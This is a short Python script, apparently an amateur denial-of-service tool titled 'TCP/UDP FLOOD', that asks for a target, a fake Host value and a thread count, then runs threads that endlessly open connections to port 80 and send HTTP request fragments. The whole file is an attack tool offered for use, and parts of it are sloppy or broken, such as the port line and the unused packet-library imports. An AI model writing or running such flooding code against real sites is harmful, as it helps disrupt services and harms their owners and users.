#good script by ded
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name
from random import choice
import requests
import socket
try:
    from scapy.all import *
    from scapy.layers.inet import TCP, IP
    is_erroring = True
except:
    pass

# http://m.bibika.ru/
os.system("clear")
print("З А Г Р У З К А....")
time.sleep(2.5)
os.system("clear")

print("###########################")
print("###### TCP/UDP FLOOD ######")
print("###########################")
print()
awnser_target = input(" Target/URL:=> ")
awnser_fakeip = input(" HOST/IP:=> ")
awnser_threads =input(" THREADS/Потоки:=> ")

target = awnser_target
port = 80;443
fake_ip = awnser_fakeip

attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()

for i in range(int(awnser_threads)):
    thread = threading.Thread(target=attack)
    thread.start()
